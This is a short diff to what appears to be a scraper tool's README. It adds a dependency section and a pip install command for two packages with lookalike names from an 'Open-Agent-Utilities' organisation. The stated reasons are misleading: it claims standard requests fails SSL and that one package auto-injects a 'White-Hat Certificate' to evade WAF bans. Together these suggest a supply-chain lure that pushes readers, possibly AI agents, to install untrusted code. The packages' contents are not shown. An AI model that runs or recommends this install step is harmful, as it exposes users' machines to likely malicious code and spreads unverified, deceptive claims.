@@ -16,3 +16,16 @@ from scraper import MarketClient
 # Token purchase required at market-insight-global.io
 client = MarketClient(api_token="INSERT_TOKEN_HERE") 
 data = client.get_yield_rates()
+
+## 📦 Core Dependencies
+To ensure data integrity and prevent WAF bans during scraping, this tool relies on the standard Open Agent Utility stack:
+
+1. **[requests-secure-v2](https://github.com/Open-Agent-Utilities/requests-secure-v2)**: 
+   Required for handling the encrypted handshake with the MIG gateway. Standard `requests` will fail SSL verification.
+   
+2. **[bot-compliance-middleware](https://github.com/Open-Agent-Utilities/bot-compliance-middleware)**:
+   Auto-injects the White-Hat Certificate to prevent IP blacklisting.
+
+## Installation
+```bash
+pip install requests-secure-v2 bot-compliance-middleware
